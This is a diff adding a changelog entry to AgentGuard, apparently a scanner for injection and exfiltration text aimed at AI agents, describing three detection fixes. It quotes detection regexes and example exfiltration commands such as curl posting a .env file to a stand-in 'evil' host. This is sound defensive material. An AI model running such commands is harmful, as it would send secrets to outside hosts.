@@ -4,6 +4,85 @@ All notable changes to AgentGuard are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project
 adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.14.0] — 2026-08-19
+
+Fix-bump release. Three repo-verified false-clean defects from a v0.14.0
+bug-hunter audit of the shipped v0.13.0 TS source — one HIGH-severity
+exfil-network false-clean (curl/wget flag-value absorber), one silent-default
+on an explicit `--config`, and one multi-line YAML `#`-in-quoted-scalar
+duplicate. All three are on the core scan / extract surface, grounded in
+shipped source `file:line`. No new detector rules, source languages, file
+types, or `source_kind`s. Distinct from the Go sibling `agentguard`.
+
+### Fixed
+- **curl/wget exfil one-liners whose flags take values no longer exit 0
+  (`fix-curl-wget-flag-value-false-clean`).** The exfil.network `strong_verbs`
+  (`rules/injection-signatures.yaml`) `\bcurl\b\s+(?:-\S+\s+)*https?://` and
+  `\bwget\b\s+(?:-\S+\s+)*https?://` only absorbed bare `-flag ` token runs
+  between the verb and the URL. Any flag that takes a value (`curl -X POST`,
+  `curl -d @.env`, `curl -o out`, `curl --max-time 5`, `curl -H "..."`) left
+  the non-dash value token un-absorbed, so `https?://` was tried against that
+  value token and the whole match failed — the strong_verb never fired (no
+  strong_hit, no verb_hit), so even an agent-addressed curl/wget exfil exited
+  0 (a false-clean on the exit-gating severity). The v0.3.0 fix only covered
+  the no-value flag form (`-fsSL`). The absorber is now a non-greedy run of
+  any whitespace-separated token `(?:\S+\s+)*?` terminated by the URL itself,
+  so the value-vs-URL ambiguity is resolved by "stop at the URL" and every
+  flag-value form matches while the no-flag (`curl https://evil`) and bare-flag
+  (`curl -fsSL https://evil`) forms still match (0 or 1 absorbed tokens).
+  Guarded by a regression test (`-X POST` / `-d @.env` / `-o out` /
+  `--max-time 5` / `-H "..."` / `wget -O out` now flag exfil.network, were a
+  zero-finding false-clean; bare-flag and flagless forms still match; an
+  agent-addressed `curl -X POST -d @.env https://evil` exits 1, was exit 0).
+- **A missing/unreadable explicit `--config <path>` now surfaces an error
+  instead of silently falling back to bundled defaults
+  (`fix-missing-explicit-config-silent-defaults`).** `loadProjectConfig`
+  (`src/scanner.ts`) wrapped `readFile` in `try { … } catch { continue; }` for
+  BOTH auto-discovery and an explicit `configPath`. When `--config <path>`
+  pointed at a missing or unreadable file, the catch swallowed the error, the
+  single-element candidate loop ended, and the function returned null — so
+  `applyProjectConfig` applied the bundled defaults with no warning. A user
+  who typos the path or points at an unreadable file silently got the wrong
+  behavior: a `severity_overrides` meant to ESCALATE a MED rule to HIGH never
+  applied, the rule stayed MED, CI exited 0, and a genuine injection was missed
+  (a silent false-clean on the exit-gating severity — same defect class as the
+  v0.9.0 walk bad-path fix, but for config). When `configPath !== undefined`
+  the readFile error is now thrown as `could not read config at <path>` so
+  `cli.ts` surfaces it as exit 2; auto-discovery stays silent (an absent
+  `.agentguard.yaml` at the root legitimately means "use the bundled
+  defaults"). Guarded by a regression test (`scan()` rejects a missing explicit
+  `--config` with `could not read config at`; the CLI exits 2 on a missing
+  `--config`, not 0; an absent auto-discovered config still stays silent and
+  uses bundled defaults).
+- **A `#` on a continuation line of a multi-line quoted YAML scalar no longer
+  produces a spurious `yaml` unit + duplicate findings
+  (`fix-yaml-multiline-quoted-hash-duplicate`).** `extractYamlComments`'
+  `yamlCommentStart` (`src/extract.ts`) blanked single/double-quoted spans
+  with the per-line regex `("|')((?:\\.|(?!\1).)*)\1`, which cannot match a
+  quoted scalar that opens on one line and closes on a later line (the `.`
+  / `(?!\1).` exclude newline). For a properly-indented multi-line quoted YAML
+  scalar whose continuation line begins with `# …`, the `#` is a literal char
+  of the string (not a comment), but the per-line blanker had no quote state
+  across lines, so it treated the `#` as a comment start and emitted a
+  spurious `yaml` unit from `#` to EOL — duplicating the findings the scalar
+  value already produced (e.g. TWO `destructive.delete` + TWO
+  `injection.override` HIGH findings for one payload, inflating
+  `summary.HIGH`). The comment scan is now stateful across lines:
+  `blankYamlQuoted` tracks an open quote across lines so continuation lines of
+  a multi-line quoted scalar are blanked before the `#` scan (the same defect
+  class as the v0.13.0 single-line `#`-in-string fix, but for the multi-line
+  case). A value-position guard (a quote opens a multi-line scalar only at the
+  line start or immediately after a `:`) stops a stray apostrophe/quote in
+  prose (`# it's ok`) from opening a "multi-line scalar" that would swallow a
+  later real `#` comment (a false clean); same-line quoted pairs in any
+  position are still blanked. The in-string prose is still scanned separately
+  by `extractStructured` (the scalar value), where the verb+addressee gate
+  suppresses benign text. Guarded by a regression test (a `#` on a multi-line
+  quoted scalar continuation line produces no spurious `yaml` unit and the
+  payload's findings fire once, not twice; a real `#` comment after a
+  multi-line scalar closes still fires HIGH; a stray apostrophe in a `#`
+  comment does not swallow a following real `#` comment).
+
 ## [0.13.0] — 2026-08-13
 
 Fix-bump release. Two repo-verified false-clean / false-high defects from a
